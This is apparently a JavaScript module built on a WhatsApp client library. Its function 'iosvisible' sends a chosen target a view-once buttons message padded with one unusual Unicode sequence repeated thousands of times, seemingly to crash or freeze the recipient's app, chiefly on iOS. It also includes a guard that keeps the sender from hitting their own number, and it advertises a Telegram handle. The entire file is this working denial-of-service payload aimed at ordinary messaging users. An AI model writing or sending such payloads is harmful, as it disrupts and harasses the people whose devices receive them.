const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function iosvisible(sock, target) {
    if (!sock || !target) {
        console.log('[IosVisible] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never target the paired number itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[IosVisible] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    try {
        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        locationMessage: {
                            degreesLongitude: 0,
                            degreesLatitude: 0,
                            name: "𑇂𑆵𑆴𑆿".repeat(9000)
                        },
                        contentText: "Telegram @shahzu_404",
                        buttons: [{
                            buttonId: "uwu",
                            buttonText: {
                                displayText: "𑇂𑆵𑆴𑆿".repeat(1000)
                            },
                            type: 1
                        }],
                        headerType: 6
                    }
                }
            }
        }, {
            noSelfSync: true,
            additionalAttributes: {}
        });
    } catch (e) {
        console.log('[IosVisible]', (e && e.message) ? e.message : e);
    }
}

module.exports = { iosvisible };
